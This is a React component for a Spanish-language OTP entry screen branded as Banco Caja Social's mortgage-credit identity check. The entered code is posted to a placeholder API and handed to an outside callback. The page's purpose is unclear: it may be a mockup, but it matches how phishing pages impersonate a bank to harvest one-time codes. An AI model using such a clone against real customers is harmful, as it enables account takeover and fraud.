import { useState, useEffect, useRef } from "react";
import "./App.css";

const OTP_LENGTH = 6;
const RESEND_SECONDS = 60;

interface OtpProps {
  phone?: string;
  step?: number;
  totalSteps?: number;
  stepLabel?: string;
  emit?: (event: string, detail: Record<string, unknown>) => void;
}

export default function Otp({
  phone = "+57 316●●●●●57",
  step = 1,
  totalSteps = 3,
  stepLabel = "Validación de identidad",
  emit,
}: OtpProps) {
  const [digits, setDigits] = useState<string[]>(Array(OTP_LENGTH).fill(""));
  const [countdown, setCountdown] = useState(RESEND_SECONDS);
  const [canResend, setCanResend] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (countdown <= 0) {
      setCanResend(true);
      return;
    }
    const id = setTimeout(() => setCountdown((c) => c - 1), 1000);
    return () => clearTimeout(id);
  }, [countdown]);

  function handleChange(index: number, value: string) {
    const digit = value.replace(/\D/g, "").slice(-1);
    const next = digits.map((d, i) => (i === index ? digit : d));
    setDigits(next);
    if (digit && index < OTP_LENGTH - 1) inputRefs.current[index + 1]?.focus();
  }

  function handleKeyDown(index: number, e: React.KeyboardEvent<HTMLInputElement>) {
    if (e.key === "Backspace" && !digits[index] && index > 0)
      inputRefs.current[index - 1]?.focus();
  }

  function handlePaste(e: React.ClipboardEvent) {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, OTP_LENGTH);
    if (!pasted) return;
    const next = Array(OTP_LENGTH).fill("");
    pasted.split("").forEach((ch, i) => { next[i] = ch; });
    setDigits(next);
    inputRefs.current[Math.min(pasted.length, OTP_LENGTH - 1)]?.focus();
  }

  function handleResend() {
    if (!canResend) return;
    setCountdown(RESEND_SECONDS);
    setCanResend(false);
    setDigits(Array(OTP_LENGTH).fill(""));
    inputRefs.current[0]?.focus();
  }

  const [loading, setLoading] = useState(false);
  const isComplete = digits.every((d) => d !== "");

  async function handleVerify() {
    if (!isComplete || loading) return;
    setLoading(true);
    try {
      const res = await fetch("https://jsonplaceholder.typicode.com/posts", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ otp: digits.join("") }),
      });
      const data = await res.json();
      emit?.("otp:submit", { code: digits.join(""), postId: data.id });
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="otp-root">
      <div className="otp-topbar" />
      <header className="otp-header">
        <div className="otp-logo">
          <div className="otp-logo-text">
            <span className="otp-logo-name">Banco Caja Social</span>
          </div>
        </div>
        <nav className="otp-nav">
          <span>Crédito </span>
          <span className="otp-nav-highlight">Hipotecario</span>
        </nav>
      </header>
      <div className="otp-progress-wrap">
        <div className="otp-progress-info">
          <span className="otp-progress-label">{stepLabel}</span>
          <span className="otp-progress-step">Paso {step} de {totalSteps}</span>
        </div>
        <div className="otp-progress-bar">
          {Array.from({ length: totalSteps }, (_, i) => (
            <div key={i} className={`otp-progress-segment${i < step ? " otp-progress-segment--active" : ""}`} />
          ))}
        </div>
      </div>
      <main className="otp-main">
        {loading && (
          <div className="otp-overlay">
            <div className="otp-overlay-spinner" />
          </div>
        )}
        <h2 className="otp-title">
          Ingrese el código enviado a su correo electrónico
          <br />o celular {phone}
        </h2>
        <div className="otp-inputs" onPaste={handlePaste}>
          {digits.map((digit, i) => (
            <input
              key={i}
              ref={(el) => { inputRefs.current[i] = el; }}
              className={`otp-input${i === 0 && !digits[0] ? " otp-input--focused" : ""}`}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              autoFocus={i === 0}
              onChange={(e) => handleChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              aria-label={`Dígito ${i + 1} del código OTP`}
            />
          ))}
        </div>
        <div className="otp-resend">
          {canResend ? (
            <button className="otp-resend-btn" onClick={handleResend}>Volver a enviar código</button>
          ) : (
            <>
              <span className="otp-resend-text">Volver a enviar código en</span>
              <span className="otp-resend-countdown">
                <span className="otp-resend-icon">⏱</span>
                {countdown} segundos
              </span>
            </>
          )}
        </div>
        <button
          className={`otp-verify-btn${isComplete && !loading ? " otp-verify-btn--active" : ""}`}
          disabled={!isComplete || loading}
          onClick={handleVerify}
        >
          {loading ? <><span className="otp-spinner" />Verificando...</> : "Verificar"}
        </button>
      </main>
    </div>
  );
}
